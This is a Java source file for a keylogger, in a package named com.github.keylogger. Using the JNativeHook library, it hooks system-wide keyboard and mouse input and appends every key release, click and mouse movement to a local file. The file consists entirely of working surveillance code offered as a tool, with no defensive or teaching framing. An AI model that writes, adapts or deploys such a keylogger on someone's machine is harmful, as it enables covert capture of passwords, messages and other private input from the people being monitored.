package com.github.keylogger;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;
import org.jnativehook.mouse.NativeMouseMotionListener;
import org.jnativehook.mouse.NativeMouseWheelEvent;
import org.jnativehook.mouse.NativeMouseWheelListener;

public class Logger implements NativeKeyListener, NativeMouseWheelListener, NativeMouseListener, NativeMouseMotionListener {

    private final File file;
    private final FileWriter w;

    public Logger(File file) throws IOException, NativeHookException {
        this.file = file;
        this.w = new FileWriter(this.file);

    }

    public void run() throws NativeHookException {
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(this);
        GlobalScreen.addNativeMouseMotionListener(this);
        GlobalScreen.addNativeMouseListener(this);
    }

    private void write(String keyText) {
        keyText = keyText + "\n";
        try {
            Files.write(this.file.toPath(), keyText.getBytes(), StandardOpenOption.APPEND);
        } catch (IOException ex) {
            java.util.logging.Logger.getLogger(Logger.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        write(e.paramString());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    @Override
    public void nativeMouseWheelMoved(NativeMouseWheelEvent nmwe) {
        write(nmwe.paramString());
    }

    @Override
    public void nativeMouseClicked(NativeMouseEvent nme) {
        write(nme.paramString());
    }

    @Override
    public void nativeMousePressed(NativeMouseEvent nme) {
        write(nme.paramString());
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent nme) {
        write(nme.paramString());
    }

    @Override
    public void nativeMouseMoved(NativeMouseEvent nme) {
        write(nme.paramString());
    }

    @Override
    public void nativeMouseDragged(NativeMouseEvent nme) {
        write(nme.paramString());
    }

}
